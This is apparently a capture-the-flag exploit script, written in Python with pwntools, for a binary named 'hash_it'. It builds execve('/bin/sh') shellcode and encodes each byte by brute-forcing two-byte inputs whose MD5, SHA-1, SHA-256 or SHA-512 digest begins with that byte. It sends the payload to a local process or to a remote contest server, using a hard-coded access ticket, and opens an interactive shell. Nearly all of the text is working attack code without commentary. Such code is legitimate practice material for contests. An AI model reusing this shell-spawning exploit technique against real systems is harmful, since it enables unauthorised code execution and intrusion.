#!/usr/bin/env python3

from pwn import *
import hashlib

binary = context.binary = ELF('./hash_it',checksec=False)

shellcode = asm(f'''
lea rdi, [rip+binsh]
xor rsi, rsi
xor rdx, rdx
mov eax, {constants.SYS_execve}
syscall
binsh: .asciz "/bin/sh"
''')

s = b''
for i, c in enumerate(shellcode):
	for j in range(2**16):
		if i & 3 == 0: m = hashlib.md5()
		if i & 3 == 1: m = hashlib.sha1()
		if i & 3 == 2: m = hashlib.sha256()
		if i & 3 == 3: m = hashlib.sha512()
		m.update(p16(j))
		if m.digest()[0] == c:
			s += p16(j)
			break
	else:
		print('failed')
		sys.exit(1)

if args.REMOTE:
	p = remote('hash-it-0-m7tt7b7whagjw.shellweplayaga.me',31337)
	p.sendlineafter(b'Ticket please: ',b'ticket{TackCormorant970n22:7BX7Fil8VnjawYCOu7riER6pzHaYzLr7ZF3DYF8zJOC8Wr9P}')
	sleep(0.2)
else:
	p = process(binary.path)

p.send(p32(len(s))[::-1])
p.send(s)
p.interactive()
